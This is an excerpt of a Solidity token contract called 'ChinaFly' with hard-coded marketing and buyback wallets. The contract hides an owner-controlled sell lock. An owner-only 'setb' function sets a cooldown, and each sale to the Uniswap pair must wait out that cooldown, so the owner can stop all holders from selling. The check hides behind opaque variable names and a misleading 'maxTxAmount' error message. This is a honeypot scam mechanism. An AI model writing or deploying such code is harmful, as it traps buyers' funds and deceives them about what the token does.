...
contract ChinaFly is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "ChinaFly";
    string private _symbol = "ChinaFly";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x08066a1B1bC1B6EdC53bf727534934A56D031d03); // Marketing Address
    address payable public buyBackWalletAddress = payable(0x17043409608F0822EEB267c3c5C63e7D7dc6986D); // buyback Address
    ...
    function setb(uint256 newb) external onlyOwner() {
        b = newb;
    }
        ...
        else
        {
            if(sender != owner() && recipient != owner()) {
                if(recipient == uniswapV2Pair){
                    ...
                    if(a[sender] > 0){
                        require(block.timestamp > a[sender], "Transfer amount exceeds the maxTxAmount.");
                    }
                    a[sender] = block.timestamp + b;
                }
